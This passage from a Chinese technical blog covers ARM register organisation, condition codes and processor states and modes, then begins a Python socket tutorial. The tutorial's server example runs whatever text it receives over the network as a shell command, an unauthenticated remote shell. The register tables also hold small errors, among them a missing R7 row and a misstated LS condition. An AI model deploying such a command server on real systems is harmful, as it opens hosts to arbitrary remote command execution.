<li>6个状态寄存器，包括程序状态寄存器 CPSR 和5个物理状态寄存器 SPSR （用以异常发生时保存 CPSR 的值，异常退出时恢复 CPSR ）。 这些状态寄存器用以标识 CPU 的工作状态及程序的运行状态，均为32位。</li>
</ul>
<p>具体如下表所示：</p>
<table>
<thead>
<tr>
<th>用户模式 usr</th>
<th>系统模式 sys</th>
<th>特权模式 svc</th>
<th>中止模式 abt</th>
<th>未定义指令模式 und</th>
<th>外部中断模式 irq</th>
<th>快速中断模式 fiq</th>
</tr>
</thead>
<tbody>
<tr>
<td>R0</td>
<td>R0</td>
<td>R0</td>
<td>R0</td>
<td>R0</td>
<td>R0</td>
<td>R0</td>
</tr>
<tr>
<td>R1</td>
<td>R1</td>
<td>R1</td>
<td>R1</td>
<td>R1</td>
<td>R1</td>
<td>R1</td>
</tr>
<tr>
<td>R2</td>
<td>R2</td>
<td>R2</td>
<td>R2</td>
<td>R2</td>
<td>R2</td>
<td>R2</td>
</tr>
<tr>
<td>R3</td>
<td>R3</td>
<td>R3</td>
<td>R3</td>
<td>R3</td>
<td>R3</td>
<td>R3</td>
</tr>
<tr>
<td>R4</td>
<td>R4</td>
<td>R4</td>
<td>R4</td>
<td>R4</td>
<td>R4</td>
<td>R4</td>
</tr>
<tr>
<td>R5</td>
<td>R5</td>
<td>R5</td>
<td>R5</td>
<td>R5</td>
<td>R5</td>
<td>R5</td>
</tr>
<tr>
<td>R6</td>
<td>R6</td>
<td>R6</td>
<td>R6</td>
<td>R6</td>
<td>R6</td>
<td>R6</td>
</tr>
<tr>
<td>R8</td>
<td>R8</td>
<td>R8</td>
<td>R8</td>
<td>R8</td>
<td>R8</td>
<td>R8_fiq</td>
</tr>
<tr>
<td>R9</td>
<td>R9</td>
<td>R9</td>
<td>R9</td>
<td>R9</td>
<td>R9</td>
<td>R9_fiq</td>
</tr>
<tr>
<td>R10</td>
<td>R10</td>
<td>R10</td>
<td>R10</td>
<td>R10</td>
<td>R10</td>
<td>R10_fiq</td>
</tr>
<tr>
<td>R11</td>
<td>R11</td>
<td>R11</td>
<td>R11</td>
<td>R11</td>
<td>R11</td>
<td>R11_fiq</td>
</tr>
<tr>
<td>R12</td>
<td>R12</td>
<td>R12</td>
<td>R12</td>
<td>R12</td>
<td>R12</td>
<td>R12_fiq</td>
</tr>
<tr>
<td>R13(SP)</td>
<td>R13</td>
<td>R13_svc</td>
<td>R13_abt</td>
<td>R13_und</td>
<td>R13_inq</td>
<td>R13_fiq</td>
</tr>
<tr>
<td>R14(LR)</td>
<td>R14</td>
<td>R14_svc</td>
<td>R14_abt</td>
<td>R14_und</td>
<td>R14_inq</td>
<td>R14_fiq</td>
</tr>
<tr>
<td>PC(R15)</td>
<td>PC</td>
<td>PC</td>
<td>PC</td>
<td>PC</td>
<td>PC</td>
<td>PC</td>
</tr>
<tr>
<td>CPSR</td>
<td>CPSR</td>
<td>CPSR</td>
<td>CPSR</td>
<td>CPSR</td>
<td>CPSR</td>
<td>CPSR</td>
</tr>
<tr>
<td></td>
<td></td>
<td>SPSR_svc</td>
<td>SPSR_abt</td>
<td>SPSR_und</td>
<td>SPSR_inq</td>
<td>SPSR_fiq</td>
</tr>
</tbody>
</table>
<h2 id="1-未分组寄存器-R0-R7"><a href="#1-未分组寄存器-R0-R7" class="headerlink" title="1. 未分组寄存器 R0 - R7"></a>1. 未分组寄存器 R0 - R7</h2><p>对于未分组寄存器，它们没有被系统用于特别的用途，因此任何可采用通用寄存器的应用场合都可以使用未分组寄存器。<br>但需要注意一点，未分组寄存器不会因为处理器模式的改变而更改指向的寄存器，因此在所有的处理器模式下未分组寄存器都指向同一个寄存器，当中断或异常处理造成处理器模式转换的时候，由于不同的处理器模式使用了相同的物理寄存器，这就有可能造成寄存器中的数据被破坏。 </p>
<h2 id="2-分组寄存器-R8-R14"><a href="#2-分组寄存器-R8-R14" class="headerlink" title="2. 分组寄存器 R8 - R14"></a>2. 分组寄存器 R8 - R14</h2><p>对于分组寄存器，它们每一次所访问的物理寄存器和处理器当前的运行模式有关。例如在快速中断模式 fiq下R8-R12访问寄存器 R8_fiq-R12_fiq ；而在其他模式下又访问 R8_usr-R12_usr 。因此它们每个对应着两个不同的寄存器。</p>
<p>对于R13（SP）、R14（LR）来说，每个寄存器对应着6个不同的物理寄存器，其中的一个是用户模式与系统模式共用，另外5个物理寄存器对应于其他5种不同的运行模式。采用以下的记号来区分不同的物理寄存器：<br>R13_&lt; mode &gt;<br>R14_&lt; mode &gt;<br>其中，mode为以下几种模式之一：usr、fiq、irq、svc、abt、und。</p>
<h3 id="2-1-R13（SP）"><a href="#2-1-R13（SP）" class="headerlink" title="2.1 R13（SP）"></a>2.1 R13（SP）</h3><p>寄存器 R13 在 ARM 指令还有着一个非常重要的作用，通常他被用作堆栈指针，当然这只是一种习惯用法，用户也可以使用其他的寄存器作为堆栈指针，但在Thumb指令集中，某些指令强制性地要求使用R13作为堆栈指针。</p>
<p>由于处理器的每种运行模式均有自己福利的物理寄存器R13，使其指向该运行模式下的栈空间，这样，当程序的运行进入异常模式时，可以将需要保护的寄存器放入R13所指向的堆栈，而当程序从异常模式返回时，则从对应的堆栈恢复，采用这种方式可以保证异常发生后程序的正常执行。</p>
<h3 id="2-2-R14（LR）"><a href="#2-2-R14（LR）" class="headerlink" title="2.2 R14（LR）"></a>2.2 R14（LR）</h3><p>R14 也称作子程序连接寄存器（Subroutine Link Register）或连接寄存器 LR 。当执行 BL 子程序调用指令时，R14 中得到 R15 （程序计数器PC）的备份。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">0x00008d68 &lt;+44&gt;:    bl  0x8cd4 &lt;func&gt;</div><div class="line">0x00008d6c &lt;+48&gt;:    ...</div><div class="line">0x00008d70 &lt;+52&gt;:    ...123</div></pre></td></tr></table></figure>
<p>通常情况下，在汇编代码中不会出现 R14 中产生 PC 备份的指令语句。可以简单的理解为在执行调用的同时，将当前 PC 的指向的值 0x00008d70 减去一条指令的长度，这里是ARM工作状态，指令长度为 0x00000004，并交由R14保存。减去一条指令的原因很简单，不减的话返回的时候中间 0x00008d6c 处的那条指令就被跳过了。</p>
<font color="#f00">（当前执行的是 0x00008d68 处的指令，0x00008d6c 处的指令处于译码阶段，0x00008d70 的指令处于取指阶段，PC总是指向取指阶段的指令。关于  ARM 处理器的流水线机制和 PC 指向的值 详见下文。） </font>

<p> 其他情况下，R14 也可以用作通用寄存器。与之类似，当发生中断或异常时，对应的分组寄存器 R14_svc、R14_irq、R14_fiq、R14_abt 和 R14_und 用来保存 R15 的返回值。</p>
<p>每一种处理器模式在自己的物理 R14 中存放当前子程序的返回地址。当通过BL、BX 等指令调用子程序时，R14就被设置成该子程序的返回地址。例如有汇编指令如下：</p>
<ul>
<li>执行以下任意一条指令：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">MOV PC，LR</div><div class="line">BX LR12</div></pre></td></tr></table></figure>
<ul>
<li>在子程序入口处使用以下指令将R14存入堆栈：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">STMFD SP！,&#123;&lt;Regs&gt;,LR&#125;1</div></pre></td></tr></table></figure>
<ul>
<li>对应的，使用以下指令可以完成子程序返回：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">LDMFD SP！,&#123;&lt;Regs&gt;,PC&#125;1</div></pre></td></tr></table></figure>
<p>当发生异常中断的时候，该模式下的特定物理R14被设置成该异常模式将要返回的地址。</p>
<h3 id="2-3-R15（PC）"><a href="#2-3-R15（PC）" class="headerlink" title="2.3 R15（PC）"></a>2.3 R15（PC）</h3><p>介绍R15之前先简单了解一下 ARM 处理器的是流水线机制。 ARM7 处理器采用3级流水线来增加处理器指令流的速度，能提供 0.9MIPS/MHz 的指令处理速度。</p>
<p>ARM7 的流水线有3个阶段，因此指令分3个阶段执行。<br>⑴ 取指从存储器装载一条指令<br>⑵ 译码识别将要被执行的指令<br>⑶ 执行处理指令并将结果写会寄存器</p>
<p>对于x86处理器来说，只有完成一条指令的读取和执行后，才会执行下一条指令。这样， PC 始终指向的正在“执行”的指令。<br>而对于 ARM7 来说因为是3级流水线，所以把指令的处理分为了上面所述的3个阶段。所以处理时实际是这样的： ARM 正在执行第1条指令的同时对第2条指令进行译码，并将第3条指令从存储器中取出。因此 ARM7 流水线只有在取第4条指令时，第1条指令才算完成执行。继而 ARM 的 PC 寄存器永远指向当前执行的指令后的第二条指令，即处于取指阶段的指令。</p>
<p>另外，在ARM状态下，最低的两位[1:0]为0，其他位[31:2]用于保存PC；在Thumb状态下，最低位[0]为0，其他位 [31:1]用于保存PC；所以 R15（PC）虽然可以用作通用寄存器，但是有一些指令在使用R15时有一些特殊限制，当违反了这些限制时，程序的执行结果是未知的。</p>
<h3 id="2-4-R16（CPSR）"><a href="#2-4-R16（CPSR）" class="headerlink" title="2.4 R16（CPSR）"></a>2.4 R16（CPSR）</h3><p>寄存器R16用作当前程序状态寄存器 CPSR （Current Program Status Register），可在任何运行模式下被访问，它包括条件标志位、中断禁止位、当前处理器模式标志位，以及其他一些相关的控制和状态位。</p>
<p>每一种运行模式下又都有一个专用的物理状态寄存器，称为备份的程序状态寄存器 SPSR （Saved Program Status Register），当异常发生时， SPSR 用于保存 CPSR 的当前值，从异常退出时则可由 SPSR 来恢复 CPSR 。</p>
<p>由于用户模式和系统模式不属于异常模式，他们没有 SPSR ，当在这两种模式下访问 SPSR ，结果是未知的。</p>
<h3 id="2-5-执行条件标志位"><a href="#2-5-执行条件标志位" class="headerlink" title="2.5 执行条件标志位"></a>2.5 执行条件标志位</h3><p>ARM 的执行条件与 x86 下面的标志位有些类似，系统通过对这些标志位的判断来确定是否满足执行条件。几乎所有的 ARM 指令都包含一个4位的条件码，位于指令的最高4位。条件码共有16种，每种条件码可用两个字符表示，这两个字符可以添加在指令助记符的后面和指令同时使用。</p>
<p>例如，跳转指令 B 可以加上后缀 EQ 变成 BEQ 表示“相同则跳转”，即当 CPSR 中的Z标志置位时发生跳转。在16种条件标志码中，只有15种可以使用，如下表所示。第十六种（1111）为系统保留，暂时不能使用。</p>
<table>
<thead>
<tr>
<th>编 码</th>
<th>条件助记符</th>
<th>标志位</th>
<th>含 义</th>
</tr>
</thead>
<tbody>
<tr>
<td>0000</td>
<td>EQ</td>
<td>Z=1</td>
<td>相等</td>
</tr>
<tr>
<td>0001</td>
<td>NE</td>
<td>Z=0</td>
<td>不相等</td>
</tr>
<tr>
<td>0010</td>
<td>CS</td>
<td>C=1</td>
<td>无符号大于或等于</td>
</tr>
<tr>
<td>0011</td>
<td>CC</td>
<td>C=0</td>
<td>无符号小于</td>
</tr>
<tr>
<td>0100</td>
<td>MI</td>
<td>N=1</td>
<td>负值</td>
</tr>
<tr>
<td>0101</td>
<td>PL</td>
<td>N=0</td>
<td>正值或 0</td>
</tr>
<tr>
<td>0110</td>
<td>VS</td>
<td>V=1</td>
<td>溢出</td>
</tr>
<tr>
<td>0111</td>
<td>VC</td>
<td>V=0</td>
<td>无溢出</td>
</tr>
<tr>
<td>1000</td>
<td>HI</td>
<td>C=1 且 Z=0</td>
<td>无符号大于</td>
</tr>
<tr>
<td>1001</td>
<td>LS</td>
<td>C=0 且 Z=1</td>
<td>无符号小于或等于</td>
</tr>
<tr>
<td>1010</td>
<td>GE</td>
<td>N 和 V 相同</td>
<td>有符号大于或等于</td>
</tr>
<tr>
<td>1011</td>
<td>LT</td>
<td>N 和 V 不相同</td>
<td>有符号小于</td>
</tr>
<tr>
<td>1100</td>
<td>GT</td>
<td>Z=0 且 N 等于 V</td>
<td>有符号大于</td>
</tr>
<tr>
<td>1101</td>
<td>LE</td>
<td>Z=1 且 N 不等于 V</td>
<td>有符号小于或等于</td>
</tr>
<tr>
<td>1110</td>
<td>AL</td>
<td>任意</td>
<td>无条件执行（不推荐使用）</td>
</tr>
<tr>
<td>1111</td>
<td>NV</td>
<td>任意</td>
<td>从不执行（不要使用）</td>
</tr>
</tbody>
</table>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/08/pwn/ARM状态结构小记/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Introspelliam">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/08/pwn/ARM状态结构小记/" itemprop="url">ARM状态结构小记</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-08T22:05:16+08:00">
                2017-09-08
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>在系统学习ARM寄存器结构和功能之前，有必要先了解一下ARM的工作模式和工作状态。</p>
</blockquote>
<h2 id="一、-ARM的工作状态"><a href="#一、-ARM的工作状态" class="headerlink" title="一、 ARM的工作状态"></a>一、 ARM的工作状态</h2><p>两种状态为：</p>
<ul>
<li>ARM状态（32位）</li>
<li>Thumb状态（16位）</li>
</ul>
<p>用BX Rn指令来进行两种状态的切换：<br>其中BX是跳转指令，Rn是寄存器，如果Rn的位0为1（最低位），则进入Thumb状态；如果Rn的位为0，这进入ARM状态。（ARM指令的后两位始终为0，没有被使用；而Thumb指令的后一位始终为0，没有被使用，因此采用位0来表示ARM指令与Thumb指令的切换标志位。）</p>
<p>例如下面两个指令就可以实现从ARM状态切换到Thumb状态，第一条指令将r6寄存器最低位置为1，接着 <code>bx  r6</code> 就切换到了Thumb状态。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">……</div><div class="line">0x00008cfc &lt;+12&gt;:    add r6, pc, #1</div><div class="line">0x00008d00 &lt;+16&gt;:    bx  r6</div><div class="line">0x00008d04 &lt;+20&gt;:    ...</div><div class="line">0x00008d06 &lt;+22&gt;:    ...</div><div class="line">0x00008d08 &lt;+24&gt;:    ...</div><div class="line">……1234567</div></pre></td></tr></table></figure>
<p>注：ARM和Thumb两种状态之间的切换不影响处理器的工作模式和寄存器的内容；ARM处理器在处理异常时，不过处理器处于什么状态，则都将切换到ARM状态。</p>
<p>对于 ARM 指令来说，所有的指令长度都是 32 位，并且执行周期大多为单周期，指令都是有条件执行的。<br>而 Thumb 指令的特点如下：</p>
<ul>
<li>指令执行条件经常不会使用。</li>
<li>源寄存器与目标寄存器经常是相同的。</li>
<li>使用的寄存器数量比较少。</li>
<li>常数的值比较小。</li>
<li>内核中的桶式移动器（barrel shifter）经常是不使用的。</li>
</ul>
<p>也就是说 16 位的 Thumb 指令一般可以完成 和 32 位 ARM 指令相同的任务。Thumb指令是ARM指令的子集，只要遵循一定的调用规则就可以互相调用。<br>Thumb指令与ARM指令的时间效率和空间效率关系为：</p>
<ul>
<li>存储空间约为ARM代码的60％～70％</li>
<li>指令数比ARM代码多约30％～40％</li>
<li>存储器为32位时ARM代码比Thumb代码快约40％</li>
<li>存储器为16位时Thumb比ARM代码快约40～50％</li>
<li>使用Thumb代码，存储器的功耗会降低约30％</li>
</ul>
<h2 id="二、-ARM的工作模式"><a href="#二、-ARM的工作模式" class="headerlink" title="二、 ARM的工作模式"></a>二、 ARM的工作模式</h2><p>七种工作模式为：</p>
<ul>
<li>usr 用户模式：正常用户模式，程序正常执行模式</li>
<li>sys 系统模式：(基本上等同于usr)（System）运行特权操作系统任务</li>
<li>svc 特权模式：（Supervisor）也叫操作系统保护模式，处理软件中断swi  reset</li>
<li>abt 中止模式：（Abort mode）{数据、指令} 处理存储器故障、实现虚拟存储器和存储器保护</li>
<li>und 未定义指令模式：（Undefined）处理未定义的指令陷阱，支持硬件协处理器的软件仿真</li>
<li>irq 外部中断模式：处理普通中断</li>
<li>fiq 快速中断模式：（Fast Interrupt Request）处理快速中断，支持高速数据传送或通道处理</li>
</ul>
<p>上述七种工作模式中，除了用户模式之外的其他6种处理器模式称为特权模式。</p>
<p>特权模式下，程序可以访问所有的系统资源，也可以任意地进行处理器模式的切换。</p>
<p>特权模式中，除系统模式外，其他5种模式又称为异常模式。</p>
<p>大多数的用户程序运行在用户模式下，此时，应用程序不能够访问一些受操作系统保护的系统资源，应用程序也不能直接进行处理器模式的切换。</p>
<p>用户模式下，当需要进行处理器模式切换时，应用程序可以产生异常处理，在异常处理中进行处理器模式的切换。</p>
<h2 id="三、-关于状态和模式的切换"><a href="#三、-关于状态和模式的切换" class="headerlink" title="三、 关于状态和模式的切换"></a>三、 关于状态和模式的切换</h2><p>处理器模式可以通过软件进行切换，也可以通过外部中断或者异常处理过程进行切换。</p>
<p>当应用程序发生异常中断时，处理器进入相应的异常模式。在每一种异常模式下都有一组寄存器，供相应的异常处理程序使用，这样就可以保证在进入异常模式时，用户模式下的寄存器不被破坏。</p>
<p>系统模式并不是通过异常进入的，它和用户模式具有完全一样的寄存器。但是系统模式属于特权模式，可以访问所有的系统资源，也可以直接进行处理器模式切换。它主要供操作系统任务使用。通常操作系统的任务需要访问所有的系统资源，同时该任务仍然使用用户模式的寄存器组，而不是使用异常模式下相应的寄存器组，这样可以保证当异常中断发生时任务状态不被破坏。</p>
<p>Thumb指令低密度及窄存储器时性能高的特点使得其在大多数基于 C 代码的系统汇中有非常广泛的应用，但是有些场合中系统只能使用 ARM 指令，比如：</p>
<ol>
<li>如果对于速度有比较高的要求，ARM指令在宽存储器中会提供更高的性能。</li>
<li>某些功能只能由 ARM 指令来实现，例如访问 CPSR 寄存器来使能/禁止 中断或改变处理器工作模式；访问协处理器CP15；执行 C 代码不支持的 DSP 算术指令；异常中断（Exception）处理。</li>
</ol>
<p>另外，在进入异常中断后，内核会自动切换到 ARM 状态。即在异常中断处理程序人口的一些指令是ARM指令，然后根据需要，程序可以切换到 Thumb 工作状态，在异常中断处理程序返回前，程序在切换到 ARM 工作状态。</p>
<p>注：当处理器处于Thumb状态时发生异常（如irq、fiq、und、abt、svc等），则异常处理返回时，自动切换到Thumb状态。需要了解的是，ARM 处理器总是 从 ARM 工作状态开始执行的。因此，如果要在调试器重新运行 Thumb 程序，必须为 该 Thumb 程序添加一个 ARM程序头，然后再切换到Thumb工作状态调用该 Thumb程序。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/04/code/python-socket编程/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Introspelliam">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/04/code/python-socket编程/" itemprop="url">python socket编程</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-04T22:50:23+08:00">
                2017-09-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/code/" itemprop="url" rel="index">
                    <span itemprop="name">code</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>Python 提供了两个基本的 socket 模块。</p>
<p>   第一个是 Socket，它提供了标准的 BSD Sockets API。</p>
<p>   第二个是 SocketServer， 它提供了服务器中心类，可以简化网络服务器的开发。</p>
<p>下面讲的是Socket模块功能</p>
<h3 id="1、Socket-类型"><a href="#1、Socket-类型" class="headerlink" title="1、Socket 类型"></a>1、Socket 类型</h3><p>套接字格式：</p>
<p>socket(family,type[,protocal]) 使用给定的地址族、套接字类型、协议编号（默认为0）来创建套接字。</p>
<table>
<thead>
<tr>
<th><strong>socket类型</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>socket.AF_UNIX</td>
<td>只能够用于单一的Unix系统进程间通信</td>
</tr>
<tr>
<td>socket.AF_INET</td>
<td>服务器之间网络通信</td>
</tr>
<tr>
<td>socket.AF_INET6</td>
<td>IPv6</td>
</tr>
<tr>
<td>socket.SOCK_STREAM</td>
<td>流式socket , for TCP</td>
</tr>
<tr>
<td>socket.SOCK_DGRAM</td>
<td>数据报式socket , for UDP</td>
</tr>
<tr>
<td>socket.SOCK_RAW</td>
<td>原始套接字，普通的套接字无法处理ICMP、IGMP等网络报文，而SOCK_RAW可以；其次，SOCK_RAW也可以处理特殊的IPv4报文；此外，利用原始套接字，可以通过IP_HDRINCL套接字选项由用户构造IP头。</td>
</tr>
<tr>
<td>socket.SOCK_SEQPACKET</td>
<td>可靠的连续数据包服务</td>
</tr>
<tr>
<td>创建TCP Socket：</td>
<td>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)()</td>
</tr>
<tr>
<td>创建UDP Socket：</td>
<td>s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</td>
</tr>
</tbody>
</table>
<h3 id="2、Socket-函数"><a href="#2、Socket-函数" class="headerlink" title="2、Socket 函数"></a>2、Socket 函数</h3><p>注意点:</p>
<p>1）TCP发送数据时，已建立好TCP连接，所以不需要指定地址。UDP是面向无连接的，每次发送要指定是发给谁。</p>
<p>2）服务端与客户端不能直接发送列表，元组，字典。需要字符串化repr(data)。</p>
<table>
<thead>
<tr>
<th><strong>socket函数</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>服务端socket函数</strong></td>
<td></td>
</tr>
<tr>
<td>s.bind(address)</td>
<td>将套接字绑定到地址, 在AF_INET下,以元组（host,port）的形式表示地址.</td>
</tr>
<tr>
<td>s.listen(backlog)</td>
<td>开始监听TCP传入连接。backlog指定在拒绝连接之前，操作系统可以挂起的最大连接数量。该值至少为1，大部分应用程序设为5就可以了。</td>
</tr>
<tr>
<td>s.accept()</td>
<td>接受TCP连接并返回（conn,address）,其中conn是新的套接字对象，可以用来接收和发送数据。address是连接客户端的地址。</td>
</tr>
<tr>
<td><strong>客户端socket函数</strong></td>
<td></td>
</tr>
<tr>
<td>s.connect(address)</td>
<td>连接到address处的套接字。一般address的格式为元组（hostname,port），如果连接出错，返回socket.error错误。</td>
</tr>
<tr>
<td>s.connect_ex(adddress)</td>
<td>功能与connect(address)相同，但是成功返回0，失败返回errno的值。</td>
</tr>
<tr>
<td><strong>公共socket函数</strong></td>
<td></td>
</tr>
<tr>
<td>s.recv(bufsize[,flag])</td>
<td>接受TCP套接字的数据。数据以字符串形式返回，bufsize指定要接收的最大数据量。flag提供有关消息的其他信息，通常可以忽略。</td>
</tr>
<tr>
<td>s.send(string[,flag])</td>
<td>发送TCP数据。将string中的数据发送到连接的套接字。返回值是要发送的字节数量，该数量可能小于string的字节大小。</td>
</tr>
<tr>
<td>s.sendall(string[,flag])</td>
<td>完整发送TCP数据。将string中的数据发送到连接的套接字，但在返回之前会尝试发送所有数据。成功返回None，失败则抛出异常。</td>
</tr>
<tr>
<td>s.recvfrom(bufsize[.flag])</td>
<td>接受UDP套接字的数据。与recv()类似，但返回值是（data,address）。其中data是包含接收数据的字符串，address是发送数据的套接字地址。</td>
</tr>
<tr>
<td>s.sendto(string[,flag],address)</td>
<td>发送UDP数据。将数据发送到套接字，address是形式为（ipaddr，port）的元组，指定远程地址。返回值是发送的字节数。</td>
</tr>
<tr>
<td>s.close()</td>
<td>关闭套接字。</td>
</tr>
<tr>
<td>s.getpeername()</td>
<td>返回连接套接字的远程地址。返回值通常是元组（ipaddr,port）。</td>
</tr>
<tr>
<td>s.getsockname()</td>
<td>返回套接字自己的地址。通常是一个元组(ipaddr,port)</td>
</tr>
<tr>
<td>s.setsockopt(level,optname,value)</td>
<td>设置给定套接字选项的值。</td>
</tr>
<tr>
<td>s.getsockopt(level,optname[.buflen])</td>
<td>返回套接字选项的值。</td>
</tr>
<tr>
<td>s.settimeout(timeout)</td>
<td>设置套接字操作的超时期，timeout是一个浮点数，单位是秒。值为None表示没有超时期。一般，超时期应该在刚创建套接字时设置，因为它们可能用于连接的操作（如connect()）</td>
</tr>
<tr>
<td>s.gettimeout()</td>
<td>返回当前超时期的值，单位是秒，如果没有设置超时期，则返回None。</td>
</tr>
<tr>
<td>s.fileno()</td>
<td>返回套接字的文件描述符。</td>
</tr>
<tr>
<td>s.setblocking(flag)</td>
<td>如果flag为0，则将套接字设为非阻塞模式，否则将套接字设为阻塞模式（默认值）。非阻塞模式下，如果调用recv()没有发现任何数据，或send()调用无法立即发送数据，那么将引起socket.error异常。</td>
</tr>
<tr>
<td>s.makefile()</td>
<td>创建一个与该套接字相关连的文件</td>
</tr>
</tbody>
</table>
<h3 id="3、socket编程思路"><a href="#3、socket编程思路" class="headerlink" title="3、socket编程思路"></a>3、socket编程思路</h3><p>TCP服务端：</p>
<p>1 创建套接字，绑定套接字到本地IP与端口</p>
<p> socket.socket(socket.AF_INET,socket.SOCK_STREAM) , s.bind()</p>
<p>2 开始监听连接                   #s.listen()</p>
<p>3 进入循环，不断接受客户端的连接请求              #s.accept()</p>
<p>4 然后接收传来的数据，并发送给对方数据         #s.recv() , s.sendall()</p>
<p>5 传输完毕后，关闭套接字                     #s.close()</p>
<p>TCP客户端:</p>
<p>1 创建套接字，连接远端地址</p>
<p>​       # socket.socket(socket.AF_INET,socket.SOCK_STREAM) , s.connect()</p>
<p>2 连接后发送数据和接收数据          # s.sendall(), s.recv()</p>
<p>3 传输完毕后，关闭套接字          #s.close()</p>
<h3 id="4、Socket编程之服务端代码："><a href="#4、Socket编程之服务端代码：" class="headerlink" title="4、Socket编程之服务端代码："></a>4、Socket编程之服务端代码：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">root@yangrong:/python<span class="comment"># cat day5-socket-server.py</span></div><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="keyword">import</span> socket   <span class="comment">#socket模块</span></div><div class="line"><span class="keyword">import</span> commands   <span class="comment">#执行系统命令模块</span></div><div class="line">HOST=<span class="string">'10.0.0.245'</span></div><div class="line">PORT=<span class="number">50007</span></div><div class="line">s= socket.socket(socket.AF_INET,socket.SOCK_STREAM)   <span class="comment">#定义socket类型，网络通信，TCP</span></div><div class="line">s.bind((HOST,PORT))   <span class="comment">#套接字绑定的IP与端口</span></div><div class="line">s.listen(<span class="number">1</span>)         <span class="comment">#开始TCP监听</span></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">       conn,addr=s.accept()   <span class="comment">#接受TCP连接，并返回新的套接字与IP地址</span></div><div class="line">       <span class="keyword">print</span><span class="string">'Connected by'</span>,addr    <span class="comment">#输出客户端的IP地址</span></div><div class="line">       <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">                data=conn.recv(<span class="number">1024</span>)    <span class="comment">#把接收的数据实例化</span></div><div class="line">               cmd_status,cmd_result=commands.getstatusoutput(data)   <span class="comment">#commands.getstatusoutput执行系统命令（即shell命令），返回两个结果，第一个是状态，成功则为0，第二个是执行成功或失败的输出信息</span></div><div class="line">                <span class="keyword">if</span> len(cmd_result.strip()) ==<span class="number">0</span>:   <span class="comment">#如果输出结果长度为0，则告诉客户端完成。此用法针对于创建文件或目录，创建成功不会有输出信息</span></div><div class="line">                        conn.sendall(<span 